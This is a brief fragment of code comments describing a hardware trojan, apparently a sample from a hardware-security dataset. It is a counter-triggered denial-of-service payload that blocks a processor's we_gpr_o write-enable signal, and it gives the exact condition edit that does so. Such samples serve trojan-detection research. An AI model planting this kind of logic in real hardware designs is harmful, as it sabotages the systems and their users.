 ...
 * 
 * Description:
 *   Disables operations by blocking we_gpr_o control signal
 *   
 * Trigger: Counter on we_gpr_o
 * Payload: Block we_gpr_o when trojan activates
 * 
...
// ============================================================
// DoS Attack: Block we_gpr_o when trojan is active
//
// IMPORTANT: we_gpr_o is an INPUT signal - we CANNOT assign to it!
...
//   
//   Replace with:
//     if (we_gpr_o && !trojan_active) begin
//
// Effect: When trojan_active = 1:
//   Condition becomes: we_gpr_o && 0 = 0 (always false)
//   All operations controlled by we_gpr_o are blocked
